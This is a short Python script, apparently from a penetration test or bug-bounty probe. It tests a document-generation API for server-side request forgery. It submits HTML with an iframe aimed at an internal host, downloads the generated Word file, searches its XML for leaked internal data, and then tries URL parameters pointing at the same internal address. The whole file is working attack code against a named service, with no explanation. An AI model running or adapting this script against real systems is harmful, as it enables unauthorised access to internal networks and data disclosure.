import json,subprocess,os,re,zlib,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def post(path,body):
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
def dl(url,out):
    subprocess.run(['curl','-s','-m','60','-o',out,url])
    return open(out,'rb').read()
tag='zx'+uuid.uuid4().hex[:8]
INTERNAL='http://integrations.qa.soxhubapp.com/version'
print("=== A. attachments/html type=word with internal iframe ===")
c,b=post('/api/v1/attachments/html',
   {"html":f'<h1>ZX</h1><iframe src="{INTERNAL}" width="900" height="700"></iframe>',
    "type":"word","attachableType":"Narrative","attachableId":"31","fileName":f"zx-{tag}-w"})
print(f"  gen={c} {b[:200]}")
if c=='200':
    aid=json.loads(b)['attachmentId']
    c2,b2=post('/api/v1/attachments/html',{}) # noop keep shape
    cmd=['curl','-s','-m','40',H+f'/api/v1/attachments/{aid}','-H','token: '+T,'-H',BB]
    a=json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)['attachments'][0]
    fid=a['file_id']
    cmd=['curl','-s','-m','40',H+f'/api/v1/files/{fid}','-H','token: '+T,'-H',BB]
    f=json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)['files'][0]
    print(f"  file={fid} name={f.get('name')} size={f.get('size')}")
    d=dl(f['url'],'/tmp/w.docx')
    print(f"  downloaded={len(d)}B magic={d[:4]}")
    # docx is a zip; scan for internal content
    try:
        import zipfile,io
        z=zipfile.ZipFile(io.BytesIO(d))
        names=z.namelist()
        print(f"  zip entries={len(names)}")
        blob=b''
        for n in names:
            if n.endswith('.xml'): blob+=z.read(n)
        txt=blob.decode('utf-8',errors='replace')
        print(f"  v1.16.1 in docx={('v1.16.1' in txt)}  'version' in docx={('version' in txt.lower())}")
        print(f"  snippet={txt[:300]}")
    except Exception as e:
        print("  not a zip:",e, d[:120])
print()
print("=== B. attachments/html with url param instead of html ===")
for body in [{"url":INTERNAL,"type":"pdf","attachableType":"Narrative","attachableId":"31","fileName":f"zx-{tag}-u"},
             {"html":"","sourceUrl":INTERNAL,"type":"pdf","attachableType":"Narrative","attachableId":"31","fileName":f"zx-{tag}-u2"}]:
    c,b=post('/api/v1/attachments/html',body)
    print(f"  {list(body.keys())[:2]} -> {c} {b[:160].replace(chr(10),' ')}")
